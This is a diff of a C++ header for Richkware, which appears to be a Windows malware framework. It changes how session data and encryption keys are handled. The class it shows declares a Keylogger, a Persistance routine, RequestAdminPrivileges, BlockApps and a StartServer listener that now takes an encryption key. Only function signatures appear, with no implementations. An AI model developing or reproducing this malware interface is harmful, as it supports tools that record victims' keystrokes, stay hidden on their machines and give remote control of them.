@@ -33,18 +33,17 @@
 
 class Richkware {
 private:
-	std::map<std::string, std::string> session;
 	HANDLE hBlockAppsTh;
-
-	std::string EncryptDecrypt(std::string input, int key);
-	void SaveSession();
-	void LoadSession();
+	
 	void SaveValueReg(const char* path, const char* key, const char* value);
 	std::string LoadValueReg(const char* path, const char* key);
 	void SaveFileDir(const char* path);
 public:
+	std::map<std::string, std::string> session;
 	std::list<const char*> dangerousApps;
 
+	void SaveSession(const char* EncryptionKey);
+	void LoadSession(const char* EncryptionKey);
 	BOOL IsAdmin();
 	void RequestAdminPrivileges();
 	void Persistance();
@@ -52,16 +51,22 @@ public:
 	void OpenApp(const char* app);
 	void BlockApps();
 	void UnBlockApps();
-	int StartServer(const char* port);
-	const char* RawRequest(const char * serverAddress, const char* port,
-		const char* request);
+	int StartServer(const char* port, const char* EncryptionKey = NULL);
+	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
 	void Hibernation();
 	void RandMouse();
 	void Keylogger(const char* fileName);
 
 };
 
-DWORD WINAPI ClientSocketThread(void* ClientSocket);
+struct ClientSocketArgs {
+	SOCKET ClientSocket;
+	const char* EncryptionKey;
+};
+
+std::string EncryptDecrypt(std::string input, const char* key);
+
+DWORD WINAPI ClientSocketThread(void* arg);
 DWORD WINAPI BlockAppsThread(void* arg);
 DWORD WINAPI KeyloggerThread(void* arg);
 
